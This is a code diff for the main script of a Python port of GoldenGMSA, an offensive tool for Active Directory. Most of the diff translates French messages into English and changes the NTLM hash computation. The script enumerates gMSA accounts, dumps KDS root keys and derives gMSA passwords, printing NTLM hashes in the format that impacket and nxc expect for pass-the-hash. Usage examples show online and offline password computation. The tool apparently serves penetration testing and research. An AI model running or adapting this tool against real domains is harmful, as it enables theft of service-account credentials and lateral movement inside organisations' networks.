@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
 """
-GoldenGMSA - Équivalence Python
-Outil pour exploiter les Group Managed Service Accounts (gMSA) dans Active Directory.
-Basé sur la recherche de Yuval Gordon (@YuG0rd).
+GoldenGMSA - Python Implementation
+Tool for exploiting Group Managed Service Accounts (gMSA) in Active Directory.
+Based on research by Yuval Gordon (@YuG0rd).
 
 Usage:
     python main.py gmsainfo [options]
-    python main.py kdsinfo [options]  
+    python main.py kdsinfo [options]
     python main.py compute [options]
 
-Pour plus de détails, consultez le README.md
+For more details, see README.md
 """
 
 import argparse
@@ -26,15 +26,15 @@ from golden_gmsa.ldap_utils import LdapUtils, LdapConnection
 
 
 def setup_logging():
-    """Configure le logging pour l'application."""
+    """Configure application logging."""
     logging.basicConfig(
-        level=logging.INFO,
+        level=logging.WARNING,
         format='%(asctime)s - %(levelname)s - %(message)s'
     )
 
 
 def process_gmsa_info(args):
-    """Traite la commande gmsainfo."""
+    """Process the gmsainfo command."""
     print()
     try:
         domain_name = args.domain.lower() if args.domain else LdapUtils.get_current_domain()
@@ -46,20 +46,20 @@ def process_gmsa_info(args):
             if gmsa:
                 print(gmsa.to_string())
             else:
-                print(f"GMSA avec SID {args.sid} non trouvé dans le domaine {domain_name}")
+                print(f"gMSA with SID {args.sid} not found in domain {domain_name}")
         else:
             gmsa_accounts = GmsaAccount.find_all_gmsa_accounts_in_domain(domain_name)
             for gmsa in gmsa_accounts:
                 print(gmsa.to_string())
                 
     except Exception as ex:
-        print(f"ERREUR: {ex}")
+        print(f"ERROR: {ex}")
         if args.verbose:
             traceback.print_exc()
 
 
 def process_kds_info(args):
-    """Traite la commande kdsinfo."""
+    """Process the kdsinfo command."""
     print()
     try:
         forest_name = args.forest.lower() if args.forest else LdapUtils.get_current_forest()
@@ -69,31 +69,31 @@ def process_kds_info(args):
         if args.guid:
             root_key = RootKey.get_root_key_by_guid(forest_name, args.guid)
             if root_key is None:
-                print(f"Clé racine KDS avec ID {args.guid} non trouvée")
+                print(f"KDS root key with ID {args.guid} not found")
             else:
                 print(root_key.to_string())
         else:
             root_keys = RootKey.get_all_root_keys(forest_name)
             for root_key in root_keys:
-                print("Test: " + root_key.to_string())
+                print(root_key.to_string())
 
     except Exception as ex:
-        print(f"ERREUR: {ex}")
+        print(f"ERROR: {ex}")
         if args.verbose:
             traceback.print_exc()
 
 
 def process_compute(args):
-    """Traite la commande compute."""
+    """Process the compute command."""
     print()
     try:
         if not args.sid:
-            raise ValueError("L'argument --sid est requis")
+            raise ValueError("--sid argument is required")
             
         domain_name = ""
         forest_name = ""
         
-        # Mode en ligne (nécessite un accès privilégié)
+        # Online mode (requires privileged access)
         if not args.kdskey or not args.pwdid:
             if not args.forest:
                 forest_name = LdapUtils.get_current_forest()
@@ -120,7 +120,7 @@ def process_compute(args):
             pwd_id = MsdsManagedPasswordId(pwd_id_bytes)
         
         if pwd_id is None:
-            print(f"Échec de localisation de l'identifiant de mot de passe géré pour le SID {args.sid}")
+            print(f"Failed to locate managed password ID for SID {args.sid}")
             return
         
         if not args.kdskey:
@@ -128,109 +128,105 @@ def process_compute(args):
         else:
             import base64
             try:
-                # Nettoyer la chaîne Base64 (supprimer espaces et retours à la ligne)
+                # Clean Base64 string (remove whitespace and newlines)
                 kdskey_clean = args.kdskey.strip().replace('\n', '').replace('\r', '').replace(' ', '')
                 if not kdskey_clean:
-                    print(f"ERREUR: La clé KDS fournie est vide")
+                    print(f"ERROR: Provided KDS key is empty")
                     return
                 root_key_bytes = base64.b64decode(kdskey_clean)
                 if not root_key_bytes:
-                    print(f"ERREUR: La clé KDS décodée est vide")
+                    print(f"ERROR: Decoded KDS key is empty")
                     return
                 root_key = RootKey(root_key_bytes=root_key_bytes)
             except base64.binascii.Error as e:
-                print(f"ERREUR: Format Base64 invalide pour la clé KDS: {e}")
+                print(f"ERROR: Invalid Base64 format for KDS key: {e}")
                 if args.verbose:
                     traceback.print_exc()
                 return
             except ValueError as e:
-                print(f"ERREUR: {e}")
+                print(f"ERROR: {e}")
                 if args.verbose:
                     traceback.print_exc()
                 return
             except Exception as e:
-                print(f"ERREUR: Impossible de décoder ou d'initialiser la clé KDS: {e}")
+                print(f"ERROR: Failed to decode or initialize KDS key: {e}")
                 if args.verbose:
                     traceback.print_exc()
                 return
         
         if root_key is None:
-            print(f"Échec de localisation de la clé racine KDS avec ID {pwd_id.root_key_identifier}")
+            print(f"Failed to locate KDS root key with ID {pwd_id.root_key_identifier}")
             return
         
-        # Récupérer les informations du compte gMSA pour l'affichage
+        # Retrieve gMSA account info for display
         gmsa_account = None
         try:
             if domain_name:
                 gmsa_account = GmsaAccount.get_gmsa_account_by_sid(domain_name, args.sid)
         except:
-            pass  # Ignorer si on ne peut pas récupérer les infos (mode hors ligne par exemple)
+            pass  # Ignore if we can't retrieve info (e.g. offline mode)
         
         pwd_bytes = GmsaPassword.get_password(
             args.sid, root_key, pwd_id, domain_name, forest_name
         )
         
-        # Afficher les informations du compte si disponibles
+        # Display account info if available
         if gmsa_account:
-            print(f"Compte gMSA:\t\t{gmsa_account.sam_account_name}")
+            print(f"gMSA Account:\t\t{gmsa_account.sam_account_name}")
             print(f"SID:\t\t\t{args.sid}")
         
-        # Le password blob contient 256 bytes, les 32 premiers bytes sont le hash NTLM (16 LM + 16 NT)
-        # NOTE: L'implémentation Python utilise une approximation du KDF (HMAC-SHA256/PBKDF2)
-        # au lieu de kdscli.dll. Les hashes peuvent différer de GoldenGMSA C#.
-        if len(pwd_bytes) >= 32:
-            lm_hash = pwd_bytes[:16].hex()
-            nt_hash = pwd_bytes[16:32].hex()
-            print(f"NTLM Hash (LM:NT):\t{lm_hash}:{nt_hash}")
+        # The password blob is 256 bytes from the KDF output.
+        # NTLM hash = MD4 of the FULL 256-byte blob.
+        # Note: gMSADumper uses [:-2] because the msDS-ManagedPassword blob has a null terminator,
+        # but raw KDF output does not — so we hash the complete blob.
+        if len(pwd_bytes) >= 2:
+            from Crypto.Hash import MD4
+            ntlm_hash_obj = MD4.new()
+            ntlm_hash_obj.update(pwd_bytes)
+            nt_hash = ntlm_hash_obj.hexdigest()
+
             print(f"NTLM Hash (NT only):\t{nt_hash}")
-            
-            # Format pour nxc/impacket avec LM vide (format standard)
+
+            # Format for nxc/impacket with empty LM hash (standard format)
             lm_hash_empty = "aad3b435b51404eeaad3b435b51404ee"
             print(f"NTLM Hash (nxc format):\t{lm_hash_empty}:{nt_hash}")
             
-            print(f"\n⚠️  NOTE: SP800-108 CTR HMAC implémenté, mais l'authentification peut échouer.")
-            print(f"   Comparez avec GoldenGMSA C# pour validation si nécessaire.")
-        
-        if args.verbose and len(pwd_bytes) >= 256:
-            print(f"\n[DÉBOGAGE] First 64 bytes (hex):\t{pwd_bytes[:64].hex()}")
-            print(f"[DÉBOGAGE] Bytes 0-15 (LM):\t\t{pwd_bytes[:16].hex()}")
-            print(f"[DÉBOGAGE] Bytes 16-31 (NT):\t\t{pwd_bytes[16:32].hex()}")
         
         import base64
         print(f"Password Blob (Base64):\t{base64.b64encode(pwd_bytes).decode('utf-8')}")
         
     except Exception as ex:
-        print(f"ERREUR: {ex}")
+        print(f"ERROR: {ex}")
         if args.verbose:
             traceback.print_exc()
 
 
 def main():
-    """Point d'entrée principal de l'application."""
+    """Main application entry point."""
     setup_logging()
     
     parser = argparse.ArgumentParser(
-        description="GoldenGMSA - Outil pour exploiter les Group Managed Service Accounts",
+        description="GoldenGMSA - Exploit Group Managed Service Accounts (gMSA) in Active Directory",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
-Exemples d'utilisation:
+Examples:
 
-# Énumérer tous les gMSA
+# Enumerate all gMSA accounts
 python main.py gmsainfo
 
-# Interroger un gMSA spécifique
+# Query a specific gMSA by SID
 python main.py gmsainfo --sid S-1-5-21-2183999363-403723741-3725858571
 
-# Dumper toutes les clés racine KDS
+# Dump all KDS Root Keys
 python main.py kdsinfo
 
-# Dumper une clé racine KDS spécifique
+# Dump a specific KDS Root Key
 python main.py kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
 
-# Calculer le mot de passe d'un gMSA (mode lazy)
+# Compute gMSA password (online mode)
 python main.py compute --sid S-1-5-21-2183999363-403723741-3725858571
 
-# Calculer le mot de passe d'un gMSA (mode hors ligne)
+# Compute gMSA password (offline mode)
 python main.py compute --sid S-1-5-21-2183999363-403723741-3725858571 \\
     --kdskey AQAAALm45UZXyuYB6Ln7smfkresAAAA... \\
     --pwdid AQAAAEtEU0sCAAAAaAEAABAAAAADAAAA...
@@ -238,9 +234,9 @@ python main.py compute --sid S-1-5-21-2183999363-403723741-3725858571 \\
     )
     
     parser.add_argument('--verbose', '-v', action='store_true',
-                       help='Activer les messages de débogage détaillés')
+                       help='Enable verbose debug output')
     
-    # Arguments d'authentification globaux
+    # Global authentication arguments
     auth_group = parser.add_argument_group('Authentication')
     auth_group.add_argument('-u', '--username', type=str,
                            help='Username (format: user@domain.com or DOMAIN\\user)')
@@ -268,41 +264,41 @@ python main.py compute --sid S-1-5-21-2183999363-403723741-3725858571 \\
     advanced_auth_group.add_argument('--use-kerberos', '--kerberos', action='store_true',
                                     help='Force Kerberos authentication')
     
-    subparsers = parser.add_subparsers(dest='command', help='Commandes disponibles')
+    subparsers = parser.add_subparsers(dest='command', help='Available commands')
     
-    # Commande gmsainfo (insensible à la casse via normalisation)
-    gmsa_parser = subparsers.add_parser('gmsainfo', 
-                                       help='Interroger les informations gMSA')
+    # gmsainfo command
+    gmsa_parser = subparsers.add_parser('gmsainfo',
+                                       help='Query gMSA account information')
     gmsa_parser.add_argument('-s', '--sid', type=str,
-                            help='Le SID du gMSA à interroger')
+                            help='SID of the gMSA to query')
     
-    # Commande kdsinfo (insensible à la casse via normalisation)
+    # kdsinfo command
     kds_parser = subparsers.add_parser('kdsinfo',
-                                      help='Interroger les informations des clés racine KDS')
+                                      help='Query KDS Root Key information')
     kds_parser.add_argument('-g', '--guid', type=str,
-                           help='Le GUID de l\'objet clé racine KDS')
+                           help='GUID of the KDS Root Key object')
     
-    # Commande compute (insensible à la casse via normalisation)
+    # compute command
     compute_parser = subparsers.add_parser('compute',
-                                          help='Calculer les mots de passe gMSA')
+                                          help='Compute gMSA passwords')
     compute_parser.add_argument('-s', '--sid', type=str, required=True,
-                               help='Le SID du gMSA')
+                               help='SID of the gMSA account')
     compute_parser.add_argument('-k', '--kdskey', type=str,
-                               help='Clé racine KDS encodée en Base64')
+                               help='Base64-encoded KDS Root Key blob')
     compute_parser.add_argument('--pwdid', type=str,
-                               help='Base64 de la valeur de l\'attribut msds-ManagedPasswordID')
+                               help='Base64-encoded msds-ManagedPasswordID attribute value')
     
-    # Parse arguments avec normalisation de la casse pour les commandes
+    # Parse arguments with case-insensitive command normalization
     raw_args = sys.argv[1:]
-    
-    # Normaliser la commande (premier argument) en minuscules si c'est une commande valide
+
+    # Normalize command (first argument) to lowercase if it's a valid command
     valid_commands = ['gmsainfo', 'kdsinfo', 'compute']
     if raw_args and raw_args[0].lower() in [cmd.lower() for cmd in valid_commands]:
         raw_args[0] = raw_args[0].lower()
     
     args = parser.parse_args(raw_args if raw_args else sys.argv[1:])
     
-    # Normaliser la commande en minuscules (insensible à la casse)
+    # Normalize command to lowercase (case-insensitive)
     if args.command:
         args.command = args.command.lower()
     
@@ -313,7 +309,7 @@ python main.py compute --sid S-1-5-21-2183999363-403723741-3725858571 \\
     try:
         ldap_conn = None
         
-        # Normaliser domain et forest en minuscules (insensible à la casse)
+        # Normalize domain and forest to lowercase
         if args.domain:
             args.domain = args.domain.lower()
         if args.forest:
@@ -369,17 +365,17 @@ python main.py compute --sid S-1-5-21-2183999363-403723741-3725858571 \\
         elif args.command == 'compute':
             process_compute(args)
         else:
-            print(f"Commande inconnue: {args.command}")
+            print(f"Unknown command: {args.command}")
             parser.print_help()
             
         if ldap_conn:
             ldap_conn.disconnect()
             
     except KeyboardInterrupt:
-        print("\nInterruption par l'utilisateur")
+        print("\nInterrupted by user")
         sys.exit(1)
     except Exception as ex:
-        print(f"Erreur fatale: {ex}")
+        print(f"Fatal error: {ex}")
         if args.verbose:
             traceback.print_exc()
         sys.exit(1)
